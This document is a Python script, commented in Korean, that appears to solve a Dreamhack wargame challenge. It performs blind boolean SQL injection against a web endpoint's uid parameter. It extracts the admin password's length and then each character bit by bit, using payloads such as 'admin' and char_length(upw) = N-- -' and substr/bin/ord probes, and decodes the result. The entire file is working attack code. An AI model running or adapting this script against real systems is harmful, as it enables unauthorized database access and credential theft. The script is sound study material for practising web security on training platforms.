from requests import get  # requests 모듈의 get 함수를 가져옴

# 타겟 호스트 URL
host = "http://host3.dreamhack.games:24327"

def find_password_length():
    password_length = 0  # 비밀번호의 길이를 초기화
    while True:
        password_length += 1  # 비밀번호 길이를 1씩 증가시킴
        # SQL 인젝션 페이로드 생성: 비밀번호 길이가 현재 길이와 같은지 확인
        query = f"admin' and char_length(upw) = {password_length}-- -"
        # GET 요청 보내기
        r = get(f"{host}/?uid={query}")
        # 응답 텍스트에 "exists"가 포함되어 있으면 길이를 찾음
        if "exists" in r.text:
            break  # 조건을 만족하면 루프 종료
    print(f"password length: {password_length}")  # 발견된 비밀번호 길이 출력
    return password_length  # 비밀번호 길이 반환

def find_bit_length(password_length):
    password = ""  # 비밀번호 문자열 초기화
    for i in range(1, password_length + 1):
        bit_length = 0  # 현재 문자의 비트 길이를 초기화
        while True:
            bit_length += 1  # 비트 길이를 1씩 증가시킴
            # SQL 인젝션 페이로드 생성: 현재 위치의 문자의 비트 길이가 현재 bit_length와 같은지 확인
            query = f"admin' and length(bin(ord(substr(upw, {i}, 1)))) = {bit_length}-- -"
            # GET 요청 보내기
            r = get(f"{host}/?uid={query}")
            # 응답 텍스트에 "exists"가 포함되어 있으면 비트 길이를 찾음
            if "exists" in r.text:
                break  # 조건을 만족하면 루프 종료
        print(f"character {i}'s bit length: {bit_length}")  # 발견된 문자 i의 비트 길이 출력
        bits = find_character_bits(i, bit_length)  # 문자 i의 비트를 찾는 함수 호출
        password += int.to_bytes(int(bits, 2), (bit_length + 7) // 8, "big").decode("utf-8")  # 비트를 바이트로 변환하여 비밀번호에 추가

    return password  # 최종 비밀번호 반환

def find_character_bits(char_index, bit_length):
    bits = ""  # 현재 문자의 비트를 저장할 문자열 초기화
    for j in range(1, bit_length + 1):
        # SQL 인젝션 페이로드 생성: 현재 위치의 문자의 j번째 비트가 1인지 확인
        query = f"admin' and substr(bin(ord(substr(upw, {char_index}, 1))), {j}, 1) = '1'-- -"
        # GET 요청 보내기
        r = get(f"{host}/?uid={query}")
        # 응답 텍스트에 "exists"가 포함되어 있으면 해당 비트는 1
        if "exists" in r.text:
            bits += "1"  # 비트 문자열에 '1' 추가
        else:
            bits += "0"  # 비트 문자열에 '0' 추가
    print(f"character {char_index}'s bits: {bits}")  # 발견된 문자 i의 비트 문자열 출력
    return bits  # 비트 문자열 반환

# 실행 부분
if __name__ == "__main__":
    password_length = find_password_length()  # 비밀번호 길이 찾기
    password = find_bit_length(password_length)  # 비밀번호 추출
    print(f"Extracted password: {password}")  # 최종 비밀번호 출력
